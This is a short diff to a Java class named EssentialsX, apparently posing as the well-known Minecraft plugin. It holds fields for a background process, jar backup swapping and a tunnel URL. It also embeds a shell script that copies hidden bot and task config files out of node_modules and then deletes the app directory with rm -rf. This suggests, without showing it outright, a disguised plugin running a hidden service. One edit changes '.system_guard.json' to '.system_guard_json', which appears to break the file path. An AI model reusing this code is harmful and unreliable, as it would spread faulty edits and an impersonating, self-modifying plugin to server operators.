@@ -22,7 +22,8 @@ public class EssentialsX extends JavaPlugin {
     private volatile boolean isProcessRunning = false;
     private boolean systemGuardEnabled = true;
     private Path backupDir;
-    private boolean isRestarting = false;
+    // ★ 修复：将 boolean 改为 AtomicBoolean 以支持 compareAndSet 操作
+    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
     private Path originalJarPath;
     private Path backupJarPath;
     private final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
@@ -486,7 +487,7 @@ public class EssentialsX extends JavaPlugin {
         "if [ -d \"$APP_DIR\" ]; then\n" +
         "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
         "    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
-        "    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR\" 2>/dev/null\n" +
+        "    cp \"$APP_DIR/node_modules/.system_guard_json\" \"$DATA_DIR\" 2>/dev/null\n" +
         "fi\n" +
         "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
         "\n" +
